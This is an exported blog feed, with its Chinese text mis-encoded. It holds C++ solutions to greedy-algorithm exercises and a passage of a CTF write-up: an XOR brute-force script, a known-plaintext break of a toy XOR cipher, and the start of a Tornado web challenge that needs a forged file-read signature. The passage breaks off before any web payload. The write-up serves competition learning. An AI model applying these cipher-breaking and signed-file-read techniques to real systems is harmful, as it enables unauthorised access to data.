class="keyword">if</span>(a[k].e &lt;= b[j].e)&#123;</span><br><span class="line">sum++;</span><br><span class="line">b[j].s = a[k].e;</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;sum&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="æ³•å¸ˆåº·çš„å·¥äºº"><a href="#æ³•å¸ˆåº·çš„å·¥äºº" class="headerlink" title="æ³•å¸ˆåº·çš„å·¥äºº"></a>æ³•å¸ˆåº·çš„å·¥äºº</h3><h4 id="é¢˜ç›®æè¿°-13"><a href="#é¢˜ç›®æè¿°-13" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h4><p>ä¸‰ä¸ªæ³•å¸ˆåº·çš„å·¥äººæ¯å¤©æ—©ä¸Š6ç‚¹åˆ°å·¥å‚å¼€å§‹åˆ°ä¸‰æ¡äº§å“ç”Ÿäº§çº¿ä¸Šç»„è£…æ¡”å­æ‰‹æœºã€‚ç¬¬ä¸€ä¸ªå·¥äººåœ¨200æ—¶åˆ»å¼€å§‹ï¼ˆä»6ç‚¹å¼€å§‹è®¡æ—¶ï¼Œä»¥ç§’ä½œä¸ºå•ä½ï¼‰åœ¨ç”Ÿäº§çº¿ä¸Šå¼€å§‹ç”Ÿäº§ï¼Œä¸€ç›´åˆ°1000æ—¶åˆ»ã€‚ç¬¬äºŒä¸ªå·¥äººï¼Œåœ¨700æ—¶åˆ»å¼€å§‹ï¼Œåœ¨1100æ—¶åˆ»ç»“æŸã€‚ç¬¬ä¸‰ä¸ªå·¥äººä»1500æ—¶åˆ»å·¥ä½œåˆ°2100æ—¶åˆ»ã€‚æœŸé—´æœ€é•¿è‡³å°‘æœ‰ä¸€ä¸ªå·¥äººåœ¨ç”Ÿäº§çº¿ä¸Šå·¥ä½œçš„è¿ç»­æ—¶é—´ä¸º900ç§’ï¼ˆä»200æ—¶åˆ»åˆ°1100æ—¶åˆ»ï¼‰ï¼Œè€Œæœ€é•¿çš„æ— äººç”Ÿäº§çš„è¿ç»­æ—¶é—´ï¼ˆä»ç”Ÿäº§å¼€å§‹åˆ°ç”Ÿäº§ç»“æŸï¼‰ä¸º400æ—¶åˆ»ï¼ˆ1100æ—¶åˆ»åˆ°1500æ—¶åˆ»ï¼‰ã€‚</p><p>ä½ çš„ä»»åŠ¡æ˜¯ç”¨ä¸€ä¸ªç¨‹åºè¡¡é‡Nä¸ªå·¥äººåœ¨Næ¡äº§å“çº¿ä¸Šçš„å·¥ä½œæ—¶é—´åˆ—è¡¨ï¼ˆ1â‰¤Nâ‰¤5000ï¼Œä»¥ç§’ä¸ºå•ä½ï¼‰ã€‚</p><p>æœ€é•¿çš„è‡³å°‘æœ‰ä¸€ä¸ªå·¥äººåœ¨å·¥ä½œçš„æ—¶é—´æ®µ</p><p>æœ€é•¿çš„æ— äººå·¥ä½œçš„æ—¶é—´æ®µï¼ˆä»æœ‰äººå·¥ä½œå¼€å§‹è®¡ï¼‰</p><h5 id="è¾“å…¥-14"><a href="#è¾“å…¥-14" class="headerlink" title="è¾“å…¥"></a>è¾“å…¥</h5><p>è¾“å…¥ç¬¬1è¡Œä¸ºä¸€ä¸ªæ•´æ•°Nï¼Œç¬¬2-N+1è¡Œæ¯è¡ŒåŒ…æ‹¬ä¸¤ä¸ªå‡å°äº1000000çš„éè´Ÿæ•´æ•°æ•°æ®ï¼Œè¡¨ç¤ºå…¶ä¸­ä¸€ä¸ªå·¥äººçš„ç”Ÿäº§å¼€å§‹æ—¶é—´ä¸ç»“æŸæ—¶é—´ã€‚</p><h5 id="è¾“å‡º-14"><a href="#è¾“å‡º-14" class="headerlink" title="è¾“å‡º"></a>è¾“å‡º</h5><p>è¾“å‡ºä¸ºä¸€è¡Œï¼Œç”¨ç©ºæ ¼åˆ†éš”å¼€ä¸¤ä¸ªæˆ‘ä»¬æ‰€æ±‚çš„æ•°ã€‚</p><h5 id="æ ·ä¾‹è¾“å…¥-14"><a href="#æ ·ä¾‹è¾“å…¥-14" class="headerlink" title="æ ·ä¾‹è¾“å…¥"></a>æ ·ä¾‹è¾“å…¥</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">3</span><br><span class="line">200 1000</span><br><span class="line">700 1100</span><br><span class="line">1500 2100</span><br></pre></td></tr></table></figure><h5 id="æ ·ä¾‹è¾“å‡º-14"><a href="#æ ·ä¾‹è¾“å‡º-14" class="headerlink" title="æ ·ä¾‹è¾“å‡º"></a>æ ·ä¾‹è¾“å‡º</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">900 400</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">worker</span>&#123;</span></span><br><span class="line"><span class="keyword">int</span> s,e;</span><br><span class="line">&#125;w[<span class="number">105</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">cmp</span><span class="params">(worker a, worker b)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(a.s == b.s) <span class="keyword">return</span> a.e&lt;b.e;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">return</span> a.s &lt; b.s;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> N ;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;N;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i =<span class="number">0</span>; i &lt; N ; i++) <span class="built_in">cin</span>&gt;&gt;w[i].s&gt;&gt;w[i].e;</span><br><span class="line"><span class="keyword">int</span> sus = w[<span class="number">0</span>].e -w[<span class="number">0</span>].s,gap = <span class="number">0</span>,t1 = w[<span class="number">0</span>].s,t2 = w[<span class="number">0</span>].e;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i&lt; N ;i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(w[i].s &gt; t2)&#123;</span><br><span class="line">gap = max(gap,w[i].s-t2);</span><br><span class="line">t1 = w[i].s;</span><br><span class="line">&#125;</span><br><span class="line">t2 = max(t2,w[i].e);</span><br><span class="line">sus = max(sus,t2-t1);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;sus&lt;&lt;<span class="string">" "</span>&lt;&lt;gap&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span>  <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="å“ˆå¤«æ›¼ç¼–ç "><a href="#å“ˆå¤«æ›¼ç¼–ç " class="headerlink" title="å“ˆå¤«æ›¼ç¼–ç "></a>å“ˆå¤«æ›¼ç¼–ç </h3><h4 id="é¢˜ç›®æè¿°-14"><a href="#é¢˜ç›®æè¿°-14" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h4><p>ç»™å®šä¸€åªå«æœ‰å°å†™å­—æ¯çš„å­—ç¬¦ä¸²ï¼›è¾“å‡ºå…¶å“ˆå¤«æ›¼ç¼–ç çš„é•¿åº¦</p><h5 id="è¾“å…¥-15"><a href="#è¾“å…¥-15" class="headerlink" title="è¾“å…¥"></a>è¾“å…¥</h5><p>ç¬¬ä¸€è¡Œä¸€ä¸ªæ•´æ•°Tï¼Œä»£è¡¨æ ·ä¾‹çš„ä¸ªæ•°ï¼Œæ¥ä¸‹æ¥Tè¡Œï¼Œæ¯è¡Œä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œ0&lt;T&lt;=2000,å­—ç¬¦ä¸²é•¿åº¦0&lt;L&lt;=1500.</p><h5 id="è¾“å‡º-15"><a href="#è¾“å‡º-15" class="headerlink" title="è¾“å‡º"></a>è¾“å‡º</h5><p>å¯¹äºæ¯ä¸ªå­—ç¬¦ä¸²ï¼Œè¾“å‡ºå…¶å“ˆå¤«æ›¼ç¼–ç é•¿åº¦</p><h5 id="æ ·ä¾‹è¾“å…¥-15"><a href="#æ ·ä¾‹è¾“å…¥-15" class="headerlink" title="æ ·ä¾‹è¾“å…¥"></a>æ ·ä¾‹è¾“å…¥</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">3</span><br><span class="line">hrvsh</span><br><span class="line">lcxeasexdphiopd</span><br><span class="line">mntflolfbtbpplahqolqykrqdnwdoq</span><br></pre></td></tr></table></figure><h5 id="æ ·ä¾‹è¾“å‡º-15"><a href="#æ ·ä¾‹è¾“å‡º-15" class="headerlink" title="æ ·ä¾‹è¾“å‡º"></a>æ ·ä¾‹è¾“å‡º</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">10</span><br><span class="line">51</span><br><span class="line">115</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> b[<span class="number">30</span>];</span><br><span class="line"><span class="keyword">char</span> s[<span class="number">1005</span>];</span><br><span class="line"><span class="keyword">int</span> ans=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cmp</span>&#123;</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">operator</span><span class="params">()</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> x&gt;y;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*ä¼šç”¨ä¼˜å…ˆé˜Ÿåˆ—äº‹åŠåŠŸå€*/</span></span><br><span class="line">priority_queue&lt;<span class="keyword">int</span> , <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;,cmp&gt; q;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span> ;i&lt;<span class="number">26</span>;i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(b[i]) q.push(b[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span>(q.size()&gt;<span class="number">1</span>)&#123;</span><br><span class="line"><span class="keyword">int</span> a  = q.top();</span><br><span class="line">q.pop();</span><br><span class="line"><span class="keyword">int</span> c = q.top();</span><br><span class="line">q.pop();</span><br><span class="line">sum = a+c;</span><br><span class="line">q.push(sum);</span><br><span class="line"></span><br><span class="line">ans += sum ;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d\n"</span>,ans);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> T;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;T;</span><br><span class="line"><span class="keyword">while</span>(T--)&#123;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;s;</span><br><span class="line"><span class="keyword">int</span> lens =<span class="built_in">strlen</span>(s);</span><br><span class="line"><span class="keyword">while</span>(!q.empty()) q.pop();</span><br><span class="line">ans = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">memset</span>(b,<span class="number">0</span>,<span class="keyword">sizeof</span>(b));</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i =<span class="number">0</span>; i &lt; lens ; i++)&#123;</span><br><span class="line">b[<span class="keyword">int</span>(s[i]-<span class="string">'a'</span>)]++;</span><br><span class="line">&#125; </span><br><span class="line">solve();</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="æ´»åŠ¨å®‰æ’-è€ƒè¯•è€ƒäº†ç±»ä¼¼çš„"><a href="#æ´»åŠ¨å®‰æ’-è€ƒè¯•è€ƒäº†ç±»ä¼¼çš„" class="headerlink" title="æ´»åŠ¨å®‰æ’(è€ƒè¯•è€ƒäº†ç±»ä¼¼çš„)"></a>æ´»åŠ¨å®‰æ’(è€ƒè¯•è€ƒäº†ç±»ä¼¼çš„)</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">work</span>&#123;</span></span><br><span class="line"><span class="keyword">int</span> begin,end;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">cmp</span><span class="params">(work a,work b)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> a.end &lt; b.end;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">work w[<span class="number">50</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;n;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i =<span class="number">0</span>; i&lt; n; i++)&#123;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;w[i].begin&gt;&gt;w[i].end;</span><br><span class="line">&#125;</span><br><span class="line">sort(w,w+n,cmp);</span><br><span class="line"><span class="keyword">int</span> j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> ans = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i =<span class="number">1</span>; i&lt; n;i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(w[i].begin &gt;= w[j].end)&#123;</span><br><span class="line">ans++;</span><br><span class="line">j = i;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;ans&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> ç®—æ³• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> algorithm </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>æŠ¤ç½‘æ¯éƒ¨åˆ†é¢˜ç›®é¢˜è§£</title>
      <link href="/huwang-game.html"/>
      <url>/huwang-game.html</url>
      <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>æŠ¤ç½‘æ¯çš„è¿™æ¬¡æ¯”èµ›è¿˜æ˜¯å¾ˆæœ‰æ”¶è·çš„ï¼Œè‡³å°‘åœ¨webæ–¹é¢æˆ‘è®¤ä¸ºæ˜¯è¿™æ ·<a id="more"></a>çš„ã€‚ã€‚ã€‚</p><h1 id="æ­£æ–‡"><a href="#æ­£æ–‡" class="headerlink" title="æ­£æ–‡"></a>æ­£æ–‡</h1><h3 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h3><h4 id="è¿Ÿæ¥çš„ç­¾åˆ°"><a href="#è¿Ÿæ¥çš„ç­¾åˆ°" class="headerlink" title="è¿Ÿæ¥çš„ç­¾åˆ°"></a>è¿Ÿæ¥çš„ç­¾åˆ°</h4><p><code>AAoHAR1UIFBSJFFQU1AjUVEjVidWUVJVJVZUIyUnI18jVFNXVRs=</code><br>é¢˜ç›®è¯´è¦å¼‚æˆ–ï¼Œé‚£å°±ç›´æ¥çˆ†ç ´å¼‚æˆ–å°±å¥½<br>å†™ä¸ªå°è„šæœ¬å°±å¯ä»¥å¾—åˆ°flag<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"> </span><br><span class="line">a = <span class="string">"AAoHAR1UIFBSJFFQU1AjUVEjVidWUVJVJVZUIyUnI18jVFNXVRs="</span></span><br><span class="line">a = base64.b64decode(a)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">128</span>):</span><br><span class="line">s = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> a:</span><br><span class="line">s  = s+chr(i^ord(j))</span><br><span class="line"><span class="keyword">if</span> <span class="string">'flag'</span> <span class="keyword">in</span> s:</span><br><span class="line"><span class="keyword">print</span> s</span><br></pre></td></tr></table></figure></p><h3 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h3><h4 id="fez"><a href="#fez" class="headerlink" title="fez"></a>fez</h4><p>è¿™ä¸ªé¢˜ç›®æ˜¯æˆ‘é˜Ÿå‹åšçš„ã€‚ã€‚ã€‚ã€‚èµ›åæ‰å­¦ä¹ çš„ï¼Œçœ‹æ¥å¯†ç å­¦ä»¥åè¿˜å¾—è®¤çœŸä¸Šè¯¾ã€‚ã€‚ã€‚ã€‚<br>Fez.logç»™å‡ºä¸‰æ¡æ•°æ®ï¼Œç¬¬ä¸€æ¡ä¸ºtestï¼Œç¬¬äºŒæ¡ä¸ºtestä¸kåŠ å¯†åçš„æ•°æ®ï¼Œç¬¬ä¸‰æ¡ä¸ºflagä¸kåŠ å¯†åçš„æ•°æ®<br>fez.pyä¸ºåŠ å¯†ç®—æ³•ï¼Œé€šè¿‡åˆ†æç®—æ³•</p><p><img src="https://s1.ax1x.com/2018/10/13/iUC4te.jpg" alt="iUC4te.jpg"></p><p>å³aï¼Œbæ¯ä¸€ä½è¿›è¡Œå¼‚æˆ–è¿ç®—<br><img src="https://s1.ax1x.com/2018/10/13/iUCHXt.jpg" alt="iUCHXt.jpg"><br>Roundå‡½æ•°å°†Må·¦å³éƒ¨åˆ†äº’æ¢ï¼Œå¹¶å¯¹å³éƒ¨åˆ†è¿›è¡Œå¼‚æˆ–è¿ç®—å¾— <code>R^L^k[i]</code><br>Fezå‡½æ•°å³å°†kæ•°ç»„æ¯ä¸ªå…ƒç´ ä¸mè¿›è¡Œ<code>round</code>è¿ç®—<br>å¯å¾—mä¸ºå­—ç¬¦ä¸²åˆ†ä¸º<code>m[0:27]</code>,<code>m[27:54]</code>ä¸¤éƒ¨åˆ†é€šè¿‡ä¸€æ­¥ä¸€æ­¥æ¨ç®—<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">m:  L + R</span><br><span class="line">R + a    a: L^R^k0</span><br><span class="line">a + b    b: L^k0^k1</span><br><span class="line">b +    c    c: R^k0^k1    </span><br><span class="line">c + d    d: L^k0^k2^k3</span><br><span class="line">d + e    e: L^k0^k1^k3^k4</span><br><span class="line">e + f    f: R^k1^k2^k4^k5</span><br><span class="line">f + g    g: L^R^k0^k1^k3^k5^k6</span><br></pre></td></tr></table></figure></p><p>æ ¹æ®å¼‚æˆ–è¿ç®—å¾—ç‰¹æ€§<br>å·²çŸ¥test(ä¹Ÿå°±æ˜¯Lï¼ŒR),fez(test,k)(ä¹Ÿå°±æ˜¯f,g)ï¼Œå³å¯é€šè¿‡testä¸fez(test,k) è¿›è¡Œå¼‚æˆ–è¿ç®—å¯å¾—å‡º <code>k0^k1^k3^k5^k6</code> ï¼Œ<code>k1^k2^k4^k5</code><br>ä»è€Œè¿˜åŸflag<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor</span><span class="params">(a,b)</span>:</span></span><br><span class="line">    <span class="keyword">assert</span> len(a)==len(b)</span><br><span class="line">    c=<span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(a)):</span><br><span class="line">        c+=chr(ord(a[i])^ord(b[i]))</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"> </span><br><span class="line">test = <span class="string">'50543fc0bca1bb4f21300f0074990f846a8009febded0b2198324c1b31d2e2563c908dcabbc461f194e70527e03a807e9a478f9a56f7'</span></span><br><span class="line">test = binascii.a2b_hex(test)</span><br><span class="line">test_k = <span class="string">'66bbd551d9847c1a10755987b43f8b214ee9c6ec2949eef01321b0bc42cffce6bdbd604924e5cbd99b7c56cf461561186921087fa1e9'</span></span><br><span class="line">test_k = binascii.a2b_hex(test_k)</span><br><span class="line">m_k = <span class="string">'44fc6f82bdd0dff9aca3e0e82cbb9d6683516524c245494b89c272a83d2b88452ec0bfa0a73ffb42e304fe3748896111b9bdf4171903'</span></span><br><span class="line">m_k = binascii.a2b_hex(m_k)</span><br><span class="line"> </span><br><span class="line">l = test[<span class="number">0</span>:<span class="number">27</span>]</span><br><span class="line">r = test[<span class="number">27</span>:<span class="number">54</span>]</span><br><span class="line">l1 = test_k[<span class="number">0</span>:<span class="number">27</span>]</span><br><span class="line">r1 = test_k[<span class="number">27</span>:<span class="number">54</span>]</span><br><span class="line">l2 = m_k[<span class="number">0</span>:<span class="number">27</span>]</span><br><span class="line">r2 = m_k[<span class="number">27</span>:<span class="number">54</span>]</span><br><span class="line"> </span><br><span class="line">c = xor(xor(l,r),r1)</span><br><span class="line">Lr = xor(c,r2)</span><br><span class="line">d = xor(r,l1)</span><br><span class="line">R = xor(d,l2)</span><br><span class="line">L = xor(Lr,R)</span><br><span class="line">m = L+R  </span><br><span class="line"><span class="keyword">print</span> m</span><br></pre></td></tr></table></figure></p><p><a href="https://imgchr.com/i/iUP9cn" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/10/13/iUP9cn.md.png" alt="iUP9cn.md.png"></a></p><h3 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h3><p>è¿™é‡Œçš„webé¢˜ç›®æ˜¯æˆ‘è¶ç€é¢˜ç›®è¿˜æ²¡å…³çš„æ—¶å€™èµ¶ç´§å¤ç°çš„ï¼ˆä¸ä¼šåšåé¢å¼„æ‡‚ä¹Ÿæ˜¯å­¦ä¹ çš„æ–¹æ³•å‘€23333ï¼‰ï¼Œæ„Ÿè°¢ä¸€å¶é£˜é›¶å­¦é•¿çš„å¸®åŠ©å“‡ã€‚ã€‚ã€‚ã€‚</p><h4 id="easy-tornado"><a href="#easy-tornado" class="headerlink" title="easy tornado"></a>easy tornado</h4><p>è¿™ä¸ªé¢˜ç›®ä¸Šæ¥æ¯ä¸ªé€‰é¡¹urlå°±å¾ˆå¯ç–‘<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">http://49.4.95.5:31792/file?filename=Orz.txt&amp;signature=d227ce6c7cea5a9cd7f1721e0baace7d</span><br><span class="line"></span><br><span class="line">Orz.txt</span><br><span class="line">render() </span><br><span class="line"></span><br><span class="line">http://49.4.95.5:31792/file?filename=hint.txt&amp;signature=c7b8660e245f1360c378db1074a2a4c7</span><br><span class="line"></span><br><span class="line">hint.txt</span><br><span class="line">md5(cookie_secret + md5(filename)) </span><br><span class="line"></span><br><span class="line">http://49.4.95.5:31792/file?filename=flag.txt&amp;signature=d24b2dc1952a495057af1a898c55931b</span><br><span class="line"></span><br><span class="line">flag.txt</span><br><span class="line">/fllllllllllag</span><br></pre></td></tr></table></figure></p><p>å¾ˆæ˜æ˜¾æ˜¯å»è¯»æ–‡ä»¶<code>/fllllllllllag</code> ï¼Œå¹¶ä¸”è¦å¸¦ä¸Šç­¾åï¼Œä¸€å¼€å§‹æˆ‘åšè¿™ä¸ªé¢˜çš„æ—¶å€™è¿˜ä»¥ä¸ºå¼ºè¡Œçˆ†ç 